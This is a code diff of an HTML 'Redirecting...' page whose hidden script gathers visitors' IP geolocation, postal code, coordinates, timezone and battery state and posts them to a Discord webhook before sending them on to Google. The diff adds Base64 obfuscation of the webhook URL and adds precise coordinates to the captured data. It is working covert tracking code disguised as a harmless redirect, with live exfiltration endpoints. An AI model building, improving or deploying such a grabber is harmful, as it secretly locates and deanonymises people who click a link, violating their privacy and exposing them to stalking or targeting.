@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Redirecting...</title>
     <style>
         body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background-color: #ffffff; }
@@ -14,7 +14,10 @@
     <div class="loader"></div>
 
     <script>
-        const webhookURL = 'https://discord.com/api/webhooks/1454716278349500478/w3XiGeCLvVnEwF6dUx2QsljpCd0U1Ijc9zQsviDSra7LgNZwey4bNo1tjZstRUyqXIXy'; 
+        const base64Webhook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODk2MDAyNjI3NzI1MzE5MS9MQzNPVktiQS1jMUo2UWVhVHNFd3E2X0N4QktfT3lPbWlyY1lsUDlkMF8yMEIzTjdTdkJxQldjT1haZ0VkQmtSakhZNA==';
+
+        // Decode the Base64 webhook URL
+        const webhookURL = atob(base64Webhook);
         const redirectURL = 'https://www.google.com';
 
         // --- EXTENDED LOGGING UTILITIES ---
@@ -52,10 +55,10 @@
 
         async function initializeCapture() {
             const startTime = performance.now();
-            
+
             try {
                 const [ipRes, battery] = await Promise.all([
-                    fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
+                    fetch('https://apip.cc/json').then(r => r.json()).catch(() => ({})),
                     navigator.getBattery ? navigator.getBattery() : Promise.resolve({ level: 0, charging: false })
                 ]);
 
@@ -77,7 +80,7 @@
                             },
                             {
                                 name: "Geography",
-                                value: `**Location:** ${ipRes.city}, ${ipRes.region}, ${ipRes.country_name}\n**Postal:** ${ipRes.postal}\n**TZ:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+                                value: `**Location:** ${ipRes.City || 'N/A'}, ${ipRes.RegionName || 'N/A'}, ${ipRes.CountryName || 'N/A'}\n**Postal:** ${ipRes.Postal || 'N/A'}\n**Coordinates:** ${ipRes.Latitude || 'N/A'}, ${ipRes.Longitude || 'N/A'}\n**TZ:** ${ipRes.TimeZone || 'N/A'}`,
                                 inline: true
                             },
                             {
